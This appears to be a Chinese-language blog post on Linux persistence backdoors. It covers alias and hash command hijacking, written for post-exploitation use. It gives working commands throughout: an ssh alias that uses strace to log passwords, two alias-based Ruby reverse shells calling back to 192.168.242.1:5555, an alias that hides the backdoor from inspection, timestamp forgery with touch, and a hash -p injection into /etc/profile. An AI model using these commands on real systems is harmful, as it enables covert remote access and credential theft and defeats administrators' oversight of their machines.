提到别名后门，不少对Linux有使用经验的老哥们都会想到alias后门，下面是一个经典的alias后门：

```shell
alias ssh='strace -o /tmp/sshwd-`date '+%d%h%m%s'`.log -e read -s2048 ssh'
```

它的目的是在持久化阶段偷取root用户的密码。这样的后门想要正常使用，往往是需要将它写到登陆配置文件（profile、bashrc）中的。运维人员自然比较容易中招，但也更容易发现识别。因为它过于明显了，又有谁闲着没事给配置文件里面搞strace不是么？（题外话，个人实践下来感觉，想要偷账户密码还是使用PAM后门或者OpenSSH编译后门更为稳定且不易发现）



下面给出一些其他的不常见别名后门。

## 安全内参-彭瑞版alias后门

去年12月底，freebuf和安全内参上发了一篇关于后门研究的文章，原文的作者提出了一些自己关于alias后门的研究与总结，它能实现用alias反弹shell，并且正常使用alias命令查看配置项无法看到写入的后门，隐蔽性很高。

链接地址：

```shell
https://www.secrss.com/articles/28412
https://www.freebuf.com/articles/system/259494.html
```

后门核心命令如下：

```shell
#使用alias反弹NCshell。
alias ls="alerts(){ ls $* --color=auto;ruby -rsocket -e 'exit if fork;c=TCPSocket.new("'"'"192.168.242.1"'"'","'"'"5555"'"'");while(cmd=c.gets);IO.popen(cmd,"'"'"r"'"'"){|io|c.print io.read}end';};alerts"

#使用alias反弹openssl shell
alias ls="alerts(){ ls $* --color=auto;ruby -rsocket -ropenssl -e 'exit if fork;c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new("'"'"192.168.242.1"'"'","'"'"5555"'"'")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,"r"){|io|c.print io.read}end';};alerts"

#屏蔽掉alias命令对后门的输出
alias which='alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde'
```

与常规的alias后门不同，作者将这些命令写入/etc/yum/yum-update.rc文件中，并将篡改后的文件的时间戳改为和其他某个文件的时间戳一致。可以说，比较麻烦，但是很鸡贼了。

```shell
touch -acmr version-groups.conf yum-update.rc
```

## hash后门

这里我想给出一种更为罕见的后门，这种后门虽然隐蔽性不如上面那么强，但是由于现网渗透场景下出现的非常少，因此也可以作为别名后门技术的一种补充。

hash命令负责显示储存命令运行时系统优先查询的哈希表，如果通过提前向哈希表内注入恶意配置项，再配合一些wrapper后门或恶意文件也能达到别名后门的效果。

```shell
echo "hash -p /usr/share/man/man1/ls.2.gz ls" >> /etc/profile
#/usr/share/man/man1/ls.2.gz 是一个恶意二进制文件，先反弹shell，再执行正常执行ls。
```

举个demo例子：

```shell
echo "hash -p /usr/bin/pwd ls" >> /etc/profile
#当执行ls时会发现变成执行了pwd
```

